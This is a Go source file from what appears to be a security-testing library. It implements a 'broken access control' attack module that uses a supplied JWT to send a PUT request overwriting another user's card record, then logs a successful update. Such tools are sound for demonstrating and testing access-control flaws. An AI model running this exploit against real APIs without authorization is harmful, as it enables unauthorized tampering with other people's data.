package broken_access_control

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	ssgo "github.com/ra9dev/ss-go"
)

var _ ssgo.Hacker = (*ModelAccessControlHacker)(nil)

// ModelAccessControlHacker exploits the fact that the user can create, read, update, or delete any record
// based on JWT permissions
type ModelAccessControlHacker struct {
	url      string
	jwtToken string

	cardToSet Card
}

// NewModelAccessControlHacker constructor
func NewModelAccessControlHacker(url, jwtToken string, cardToSet Card) ModelAccessControlHacker {
	return ModelAccessControlHacker{
		url:       url,
		jwtToken:  jwtToken,
		cardToSet: cardToSet,
	}
}

// Attack implementation of ssgo.Hacker
func (c ModelAccessControlHacker) Attack() error {
	cardJson, err := json.Marshal(c.cardToSet)
	if err != nil {
		return fmt.Errorf("failed to marshal json: %w", err)
	}

	url := c.url

	req, err := http.NewRequest(http.MethodPut, url, bytes.NewBuffer(cardJson))
	if err != nil {
		return fmt.Errorf("failed to prepare req: %w", err)
	}

	req.Header.Set(ssgo.AuthorizationHeaderKey, c.jwtToken)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fetch data from %s: %w", url, err)
	}

	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode == http.StatusOK {
		data, err := io.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("failed to read data from %s: %w", url, err)
		}

		ssgo.HackerLogger.Printf("successful card update: %s", data)

		return nil
	}

	return fmt.Errorf("failed to hack, got status code %d", resp.StatusCode)
}
